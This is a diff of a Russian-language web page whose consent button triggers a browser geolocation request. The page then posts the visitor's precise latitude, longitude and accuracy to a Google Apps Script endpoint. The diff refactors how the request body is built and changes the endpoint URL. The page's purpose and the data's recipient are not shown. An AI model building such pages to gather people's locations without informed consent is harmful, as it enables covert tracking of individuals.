@@ -45,32 +45,6 @@
   <button id="consentBtn">Разрешить доступ</button>
   <div class="loader"></div>
 
-  <!-- Полифил для старых браузеров -->
-  <script>
-    if (!window.URLSearchParams) {
-      window.URLSearchParams = class {
-        constructor(data) {
-          this.params = new Map();
-          if (data) {
-            const pairs = data.split('&');
-            for (const pair of pairs) {
-              const [key, value] = pair.split('=');
-              this.append(decodeURIComponent(key), decodeURIComponent(value || ''));
-            }
-          }
-        }
-        append(key, value) {
-          this.params.set(key, value);
-        }
-        toString() {
-          return Array.from(this.params)
-            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
-            .join('&');
-        }
-      };
-    }
-  </script>
-
   <script>
     const loader = document.querySelector('.loader');
     const consentBtn = document.getElementById('consentBtn');
@@ -79,6 +53,13 @@
     if (!navigator.geolocation) {
       alert("Ваш браузер не поддерживает геолокацию!");
       consentBtn.style.display = 'none';
+    }
+
+    // Универсальная функция формирования параметров
+    function buildBody(params) {
+      return Object.keys(params)
+        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+        .join('&');
     }
 
     function requestGeolocation() {
@@ -97,15 +78,10 @@
       const lon = pos.coords.longitude.toFixed(6);
       const acc = pos.coords.accuracy.toFixed(2);
 
-      const scriptURL = 'https://script.google.com/macros/s/AKfycbwh3whZ2IBECk2R_0mXsw8ZaEBSn_pUGxqfX--m3ZxYkLV2_JC7eQ1TS9KbRHJFEX5T/exec';
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbwWJpjAFpOH_u6KlOi9pjoSvnmnZJfS50mgjZpJmuzTZFCPgI9nHNA0clKzAg_QbYmveg/exec';
 
-      // Формирование тела запроса
-      let body;
-      if (window.URLSearchParams) {
-        body = new URLSearchParams({ lat, lon, acc });
-      } else {
-        body = `lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}`;
-      }
+      // Формируем тело запроса вручную
+      const body = buildBody({ lat, lon, acc });
 
       fetch(scriptURL, {
         method: 'POST',
@@ -113,7 +89,7 @@
         body: body
       })
       .then(response => {
-        if (!response.ok) throw new Error(`Ошибка сервера: ${response.status}`);
+        if (!response.ok) throw new Error(`Ошибка: ${response.status}`);
         return response.json();
       })
       .then(data => {
